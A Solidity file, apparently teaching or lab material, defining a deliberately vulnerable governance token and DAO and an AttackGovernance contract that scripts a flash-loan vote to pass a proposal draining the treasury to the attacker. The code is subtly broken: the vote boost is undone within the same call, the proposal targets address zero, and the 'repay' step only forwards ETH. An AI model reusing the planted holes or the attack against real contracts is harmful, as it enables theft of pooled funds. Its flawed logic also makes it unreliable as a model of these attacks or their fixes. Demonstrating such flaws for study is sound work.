// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title GovernanceToken
 * @notice Governance token vulnerable to flash loan voting
 */
contract GovernanceToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public votingPower;
    mapping(address => address) public delegates;
    string public name = "Governance";
    string public symbol = "GOV";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Delegate(address indexed delegator, address indexed delegatee);

    constructor() {
        totalSupply = 1000000 * 1e18;
        balanceOf[msg.sender] = totalSupply;
        votingPower[msg.sender] = totalSupply;
    }

    // VULNERABLE: No snapshot — voting power is current balance
    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        votingPower[msg.sender] -= amount;  // Changes voting power immediately
        votingPower[to] += amount;
        emit Transfer(msg.sender, to, amount);
    }

    // VULNERABLE: Flash loan can temporarily boost voting power
    function flashLoanVote(uint256 amount) external {
        require(balanceOf[address(this)] >= amount, "Not enough");
        votingPower[msg.sender] += amount;  // Temporary boost
        // ... vote happens here ...
        votingPower[msg.sender] -= amount;
    }
}

/**
 * @title DaoGovernance
 * @notice Governance contract with no timelock — instant execution
 */
contract DaoGovernance {
    GovernanceToken public govToken;
    mapping(uint256 => Proposal) public proposals;
    uint256 public proposalCount;
    
    struct Proposal {
        address target;
        bytes data;
        uint256 forVotes;
        uint256 againstVotes;
        bool executed;
        uint256 eta;  // execution time
    }

    event ProposalCreated(uint256 id, address target, bytes data);
    event VoteCast(uint256 proposalId, address voter, bool support, uint256 weight);
    event ProposalExecuted(uint256 id);

    constructor(address _govToken) {
        govToken = GovernanceToken(_govToken);
    }

    // Create proposal
    function propose(address target, bytes calldata data) external returns (uint256) {
        require(govToken.votingPower(msg.sender) >= 1000 * 1e18, "Not enough power");
        proposalCount++;
        proposals[proposalCount] = Proposal({
            target: target,
            data: data,
            forVotes: 0,
            againstVotes: 0,
            executed: false,
            eta: 0  // ❌ No timelock — can execute immediately
        });
        emit ProposalCreated(proposalCount, target, data);
        return proposalCount;
    }

    // Vote with governance tokens
    function castVote(uint256 proposalId, bool support) external {
        uint256 weight = govToken.votingPower(msg.sender);
        require(weight > 0, "No voting power");
        
        Proposal storage p = proposals[proposalId];
        if (support) p.forVotes += weight;
        else p.againstVotes += weight;
        
        emit VoteCast(proposalId, msg.sender, support, weight);
    }

    // Execute immediately — no timelock
    function execute(uint256 proposalId) external {
        Proposal storage p = proposals[proposalId];
        require(p.forVotes > p.againstVotes, "Not passed");
        require(!p.executed, "Already executed");
        p.executed = true;
        
        // ❌ VULNERABILITY: Immediate execution, no timelock
        (bool success, ) = p.target.call(p.data);
        require(success);
        
        emit ProposalExecuted(proposalId);
    }
}

/**
 * @title AttackGovernance
 * @notice Uses flash loan to pass malicious proposal
 */
contract AttackGovernance {
    GovernanceToken public govToken;
    DaoGovernance public dao;
    address public owner;

    constructor(address _govToken, address _dao) {
        govToken = GovernanceToken(_govToken);
        dao = DaoGovernance(payable(_dao));
        owner = msg.sender;
    }

    // Step 1: Flash loan governance tokens
    function attack() external {
        uint256 loanAmount = govToken.balanceOf(address(govToken)) * 90 / 100;
        govToken.flashLoanVote(loanAmount);
    }

    // Step 2: With boosted voting, propose malicious action
    function proposeMalicious() external {
        // Proposal to transfer all treasury to attacker
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", owner, type(uint256).max);
        dao.propose(address(0x0), data);  // target would be treasury
    }

    // Step 3: Vote and execute
    function voteAndExecute(uint256 proposalId) external {
        dao.castVote(proposalId, true);
        dao.execute(proposalId);
    }

    // Step 4: Repay flash loan
    function finalize() external {
        // Flash loan repaid when flashLoanVote returns
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
